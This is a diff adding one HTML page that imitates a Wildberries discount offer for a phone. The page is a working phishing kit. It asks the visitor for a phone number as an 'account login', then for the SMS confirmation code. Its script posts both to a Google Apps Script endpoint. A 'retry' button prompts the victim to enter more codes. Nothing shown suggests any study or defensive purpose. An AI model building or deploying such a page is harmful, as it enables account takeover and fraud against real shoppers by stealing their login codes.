@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Wildberries — Скидка на телефон</title>
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box;}
+        body{background:#f2f2f2;font-family:system-ui;padding:16px;}
+        .card{max-width:400px;margin:0 auto;background:white;border-radius:24px;padding:20px;text-align:center;}
+        img{width:100%;border-radius:16px;}
+        .price{font-size:28px;font-weight:bold;color:#F91155;}
+        .old-price{text-decoration:line-through;color:#999;}
+        .discount{background:#F91155;color:white;display:inline-block;padding:6px 12px;border-radius:40px;}
+        button{background:#6725A8;color:white;border:none;padding:14px;border-radius:60px;font-weight:bold;width:100%;cursor:pointer;}
+        input{width:100%;padding:14px;border:1px solid #ddd;border-radius:12px;margin:10px 0;}
+        .modal{display:none;position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.5);justify-content:center;align-items:center;}
+        .modal-content{background:white;border-radius:24px;padding:24px;max-width:320px;margin:auto;}
+    </style>
+</head>
+<body>
+<div class="card">
+    <img src="https://images.unsplash.com/photo-1598327105666-5b89351aff97?w=300">
+    <h2>TurboPhone X5</h2>
+    <div><span class="discount">-45%</span></div>
+    <div><span class="price">19 999 ₽</span> <span class="old-price">36 499 ₽</span></div>
+    <button onclick="openModal()">Заказать со скидкой</button>
+    <p style="font-size:11px;color:#aaa;margin-top:16px;">Введите номер — я свяжусь</p>
+</div>
+
+<div id="phoneModal" class="modal">
+    <div class="modal-content">
+        <h3>Вход в аккаунт</h3>
+        <input type="tel" id="phone" placeholder="+7 (___) ___-__-__">
+        <button id="sendPhone">Продолжить</button>
+    </div>
+</div>
+
+<div id="codeModal" class="modal">
+    <div class="modal-content">
+        <h3>Код из СМС</h3>
+        <input type="text" id="code" placeholder="Введите код">
+        <button id="sendCode">Отправить</button>
+        <button id="repeatCode" style="margin-top:10px;background:#f0f2f7;color:#6725A8;">Повторить ввод</button>
+    </div>
+</div>
+
+<script>
+    // ⬇️⬇️⬇️ ВСТАВЬТЕ ВАШ НОВЫЙ URL ОТ GOOGLE APPS SCRIPT ⬇️⬇️⬇️
+    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbyah5kKwAtOIQrj7eKCrH_xjAoflRz0EXHJiGA7x53WSju7Nq2JHht6hwm5osOVkjCK/exec";
+    
+    let userPhone = "";
+    
+    function openModal() { document.getElementById('phoneModal').style.display = 'flex'; }
+    function closeAll() { 
+        document.getElementById('phoneModal').style.display = 'none'; 
+        document.getElementById('codeModal').style.display = 'none'; 
+    }
+    
+    async function sendToScript(msg) {
+        try {
+            await fetch(SCRIPT_URL, {
+                method: 'POST',
+                headers: {'Content-Type':'application/json'},
+                body: JSON.stringify({message: msg})
+            });
+        } catch(e) { console.error(e); }
+    }
+    
+    document.getElementById('sendPhone').onclick = async () => {
+        let phone = document.getElementById('phone').value.trim();
+        if(!phone) return alert('Введите номер');
+        userPhone = phone;
+        await sendToScript(`НОВАЯ ЗАЯВКА!\n📞 Телефон: ${userPhone}\n💰 Скидка: -45%`);
+        closeAll();
+        document.getElementById('codeModal').style.display = 'flex';
+        document.getElementById('code').value = '';
+    };
+    
+    document.getElementById('sendCode').onclick = async () => {
+        let code = document.getElementById('code').value.trim();
+        if(!code) return alert('Введите код');
+        await sendToScript(`ОТВЕТ!\n📞 Телефон: ${userPhone}\n✅ Код: ${code}`);
+        alert('Спасибо! Я свяжусь с вами');
+        closeAll();
+    };
+    
+    document.getElementById('repeatCode').onclick = () => {
+        document.getElementById('code').value = '';
+        alert('Введите код ещё раз');
+    };
+</script>
+</body>
+</html>
